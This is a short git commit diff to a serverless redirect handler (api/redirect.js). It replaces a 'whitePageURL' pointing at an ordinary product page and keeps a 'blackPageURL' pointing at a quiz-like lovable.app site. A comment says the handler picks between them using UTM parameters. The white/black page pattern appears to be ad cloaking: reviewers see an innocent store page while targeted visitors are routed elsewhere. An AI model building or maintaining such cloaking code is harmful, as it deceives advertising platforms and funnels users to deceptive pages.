64d2e25e3ebc8f44c61a377330179eb480a50ca3
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-01 18:58:52 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://enamelcopenhagen.dk/products/hoops-twistie-drop-1";
+    const whitePageURL = "https://www.dorigine.de/en/products/osterreich?srsltid=AfmBOopggc2UwHmwYqCYJymH0urk20yAc0EbvPLdLWEn0kv0hgjQfWae";
     const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
